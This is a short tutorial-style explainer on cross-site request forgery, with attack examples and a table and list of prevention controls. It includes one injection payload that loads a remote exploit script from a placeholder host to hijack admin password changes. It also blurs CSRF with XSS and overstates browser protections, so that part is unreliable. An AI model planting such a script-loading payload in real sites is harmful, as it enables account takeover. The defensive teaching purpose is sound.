# Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a front-end vulnerability where attackers exploit unfiltered user input to perform unauthorized actions on behalf of authenticated users. CSRF attacks may leverage XSS vulnerabilities or other weaknesses to execute queries and API calls that the victim is authenticated to access.

## Attack Examples

### Password Change Attack
A common CSRF attack involves crafting a JavaScript payload that automatically changes the victim's password. When the victim views the payload (e.g., in a malicious comment), the code executes using their authenticated session, granting the attacker account access.

### Admin Targeting
Attackers often target admin accounts to access sensitive functions and potentially compromise backend servers. Instead of returning session cookies, attackers load remote JavaScript files:

```html
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file contains malicious code that replicates the target application's password-change functionality.

## Prevention

### Front-End Controls

| Control | Description |
|---------|-------------|
| **Sanitization** | Remove special and non-standard characters from user input before display or storage |
| **Validation** | Ensure submitted input matches expected formats (e.g., email validation) |

Always sanitize displayed output to prevent bypassed attacks from causing harm.

### Multi-Layer Defense

- **Input Filtering**: Sanitize and validate user input on both front end and back end
- **Web Application Firewall (WAF)**: Automatic injection detection (though can be bypassed)
- **Browser Protections**: Modern browsers block automatic JavaScript execution
- **Anti-CSRF Tokens**: Require unique tokens per session/request
- **SameSite Cookies**: Use `SameSite=Strict` or `Lax` to restrict cross-origin requests
- **User Verification**: Require password confirmation for sensitive actions

### Best Practices

Security should be built into application design, not reliant on external defenses. Defense layers should complement, not replace, secure coding practices.

**Reference**: [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
